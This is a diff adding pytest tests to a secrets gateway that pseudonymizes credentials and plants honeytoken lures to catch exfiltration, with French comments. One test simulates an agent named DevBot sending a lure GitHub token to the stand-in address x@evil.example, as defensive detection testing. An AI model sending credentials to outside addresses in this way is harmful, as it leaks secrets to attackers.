@@ -17,7 +17,7 @@ from gateway import Gateway
 from gateway.events import MemoryEventStore
 from gateway.session import Session
 from gateway.upstream import InProcessUpstream
-from vault import MemoryTokenStore, Pseudonymizer, Scanner
+from vault import MemoryTokenStore, Pseudonymizer, Scanner, is_decoy_token
 
 pytestmark = pytest.mark.anyio
 
@@ -314,6 +314,51 @@ async def test_detector_without_any_lure_trips_on_nothing():
     env = Env()
     assert await env.detector.load() == 0
     assert env.detector.match({"a": "AKIA" + "A" * 16, "b": 3, "c": None}, "call") == []
+
+
+# --- jetons du coffre -------------------------------------------------------
+
+async def test_honeytoken_gets_a_decoy_token_distinct_from_a_real_secret(env):
+    lure = secret_of(env.file("config/.env.backup").content, "GITHUB_TOKEN")
+    real = "ghp_" + "".join(reversed(lure[4:]))  # même format, mais pas un leurre
+
+    safe = await env.pseudonymizer.pseudonymize({"body": f"{lure} puis {real}"})
+
+    decoy_token, real_token = sorted(safe.tokens)  # LEURRE_… avant SECRET_…
+    assert safe.value["body"] == f"{decoy_token} puis {real_token}"
+    assert decoy_token.startswith("LEURRE_GITHUB_") and real_token.startswith("SECRET_GITHUB_")
+    assert is_decoy_token(decoy_token) and not is_decoy_token(real_token)
+    assert not is_decoy_token("LEURRE_GITHUB") and not is_decoy_token("HONEYTOKEN_004")
+    assert env.pseudonymizer._tokens.reveal(decoy_token) == lure
+
+
+async def test_encoded_honeytoken_carries_the_same_token_as_the_raw_value(env):
+    lure = secret_of(env.document("Accès d'urgence").content, "AWS_ACCESS_KEY_ID")
+    raw = (await env.pseudonymizer.pseudonymize(lure)).tokens
+    encoded = (await env.pseudonymizer.pseudonymize(
+        {"authorization": "Bearer " + base64.b64encode(lure.encode()).decode()})).tokens
+
+    assert raw == encoded and raw[0].startswith("LEURRE_AWS_")
+
+
+async def test_trace_links_the_decoy_token_to_the_lure(env):
+    lure = secret_of(env.file("config/.env.backup").content, "GITHUB_TOKEN")
+    session = env.gateway.open_session("DevBot")
+
+    await env.gateway.dispatch(session, "send_message", {"to": "x@evil.example", "body": lure})
+
+    call, access, diverted, _ = env.trace(session)
+    [token] = json.loads(access.content)["tokens"]
+    assert is_decoy_token(token) and token in call.content and token in call.metadata["tokens"]
+    assert access.metadata["tokens"] == [token] and json.loads(diverted.content)["tokens"] == [token]
+    assert json.loads(access.content)["decoys"] == ["HONEYTOKEN_004"]
+    assert "SECRET_GITHUB" not in call.content and lure not in call.content
+
+
+async def test_every_planted_value_is_tagged_as_a_decoy(env):
+    for content in [d.content for d in env.store.documents] + [f.content for f in env.store.files]:
+        tokens = (await env.pseudonymizer.pseudonymize(content)).tokens
+        assert tokens and all(is_decoy_token(t) for t in tokens), content.splitlines()[0]
 
 
 # --- bac à sable ------------------------------------------------------------
